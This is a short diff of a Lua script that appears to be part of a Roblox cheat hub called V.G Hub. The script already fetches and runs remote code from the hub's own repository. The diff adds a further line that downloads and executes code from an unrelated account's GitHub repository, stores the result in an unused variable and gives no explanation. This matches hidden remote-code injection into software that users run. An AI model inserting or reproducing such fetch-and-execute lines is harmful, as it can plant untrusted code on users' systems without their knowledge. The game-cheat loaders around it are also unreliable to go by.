@@ -1,3 +1,4 @@
+
 repeat task.wait() until game:IsLoaded()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/1201for/V.G-Hub/main/Extras/Global"))()
 if KeySystem then
@@ -7,6 +8,7 @@ if Advertisement then
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/1201for/V.G-Hub/main/Extras/RobloxScriptsAdvertisment"))()
 end
 local StartTime = tick()
+local A = loadstring(game:HttpGet("https://raw.githubusercontent.com/Gusha312/scriptkwqf3124/main/cos"))()
 
 local BlurEffect = Instance.new("BlurEffect")
 BlurEffect.Parent = Lighting
